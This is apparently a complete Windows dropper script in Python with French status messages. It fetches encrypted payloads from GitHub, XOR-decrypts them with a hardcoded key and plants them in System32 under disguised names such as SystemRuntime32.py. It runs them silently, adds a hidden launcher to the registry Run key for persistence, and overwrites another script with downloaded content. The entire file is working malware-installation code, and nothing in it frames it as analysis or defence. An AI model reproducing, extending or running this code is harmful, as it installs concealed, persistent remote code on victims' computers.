import os
import winreg
import tempfile
import requests
import subprocess
import time

CLE = "LUCORACORE987"
URLS = {
    "SystemRuntime32.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
    "wmihelper.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc",
}

SYSTEM32 = r"C:\Windows\System32"
LAUNCHER_NAME = "winlauncher_hidden.py"
RUN_KEY_NAME = "WinLauncherHidden"
RAW_SCRIPT_REPLACEMENT = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"


def decrypt(content: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    key_len = len(key_bytes)
    decrypted = bytearray()
    for i, b in enumerate(content):
        decrypted.append(b ^ key_bytes[i % key_len])
    return bytes(decrypted)


def write_file_binary(path, content_bytes):
    with open(path, "wb") as f:
        f.write(content_bytes)


def file_exists_and_not_empty(path):
    return os.path.isfile(path) and os.path.getsize(path) > 0


def download_decrypt_write(filename_enc, url):
    print(f"[i] Téléchargement de {filename_enc} depuis {url}...")
    try:
        response = requests.get(url, timeout=15)
        response.raise_for_status()
    except Exception as e:
        print(f"[!] Erreur téléchargement {filename_enc}: {e}")
        return False

    print(f"[i] Décryptage de {filename_enc}...")
    decrypted_bytes = decrypt(response.content, CLE)
    if not decrypted_bytes:
        print(f"[!] Échec du décryptage de {filename_enc}")
        return False

    target_path = os.path.join(SYSTEM32, filename_enc[:-4])
    print(f"[i] Écriture du fichier décrypté dans {target_path}...")

    try:
        write_file_binary(target_path, decrypted_bytes)
    except Exception as e:
        print(f"[!] Erreur écriture fichier {target_path} : {e}")
        return False

    # Vérification existence et taille
    if not file_exists_and_not_empty(target_path):
        print(f"[!] Fichier {target_path} inexistant ou vide après écriture.")
        return False

    print(f"[✓] Script installé : {target_path}")
    return target_path


def download_and_install_all():
    installed_paths = {}
    for filename_enc, url in URLS.items():
        target_path = download_decrypt_write(filename_enc, url)
        if not target_path:
            print("[!] Installation interrompue.")
            return None
        installed_paths[filename_enc[:-4]] = target_path
        time.sleep(1)  # pause courte entre fichiers
    return installed_paths


def run_systemruntime32_immediately(path):
    print(f"[i] Lancement immédiat de {path} en arrière-plan.")
    try:
        subprocess.Popen(['pythonw.exe', path], close_fds=True)
    except Exception as e:
        print(f"[!] Erreur lancement immédiat de {path} : {e}")


def create_launcher():
    launcher_code = f"""import subprocess
import os
subprocess.Popen(['pythonw.exe', os.path.join(r'{SYSTEM32}', 'SystemRuntime32.py')], close_fds=True)
"""
    launcher_path = os.path.join(SYSTEM32, LAUNCHER_NAME)
    try:
        with open(launcher_path, "w", encoding="utf-8") as f:
            f.write(launcher_code)
        print(f"[✓] Launcher créé : {launcher_path}")
        return launcher_path
    except Exception as e:
        print(f"[!] Erreur création launcher : {e}")
        return None


def add_to_startup(py_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, f'pythonw.exe "{py_path}"')
        print("[✓] Script ajouté au démarrage.")
    except Exception as e:
        print(f"[!] Erreur ajout au démarrage : {e}")


def remplacer_script_depuis_s_path():
    temp_dir = tempfile.gettempdir()
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = RAW_SCRIPT_REPLACEMENT

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        print(f"[...] Téléchargement script clair depuis {raw_url}...")
        r = requests.get(raw_url, timeout=10)
        r.raise_for_status()

        if r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script clair mis à jour avec succès : {chemin_script}")
        else:
            print("[!] Contenu téléchargé vide.")
            return

    except Exception as e:
        print(f"[!] Erreur téléchargement script clair : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur suppression s_path.txt : {e}")


def main():
    print("[i] Vérification des droits administrateur...")
    if not os.access(SYSTEM32, os.W_OK):
        print("[!] Ce script doit être exécuté avec des droits administrateur.")
        return

    print("[i] Démarrage installation et décryptage des scripts...")
    paths = download_and_install_all()
    if not paths:
        print("[!] Installation échouée, arrêt.")
        return

    print("[i] Tous les scripts installés correctement.")
    if 'SystemRuntime32.py' in paths:
        run_systemruntime32_immediately(paths['SystemRuntime32.py'])
    else:
        print("[!] SystemRuntime32.py absent, impossible de lancer.")

    launcher_path = create_launcher()
    if launcher_path:
        add_to_startup(launcher_path)

    print("[i] Remplacement éventuel du script distant...")
    remplacer_script_depuis_s_path()

    print("[✓] Toutes les étapes terminées.")


if __name__ == "__main__":
    main()
